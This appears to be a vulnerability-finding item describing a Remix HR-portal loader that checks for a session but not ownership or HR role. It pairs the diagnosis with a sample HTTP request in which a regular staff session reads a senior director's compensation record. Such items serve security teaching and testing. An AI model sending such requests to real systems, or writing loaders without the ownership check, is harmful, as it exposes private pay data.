diagnosis: The Remix route loader queries employee salary records based on params.empId. It checks that a session exists, but fails to check whether user.employeeId equals params.empId or whether user has an HR role, allowing employees to look up salaries and equity of coworkers.
exploit_request:
GET /employees/emp_senior_dir_881/compensation HTTP/1.1
Host: portal.enterprisehr.io
Cookie: session=regular_staff_session
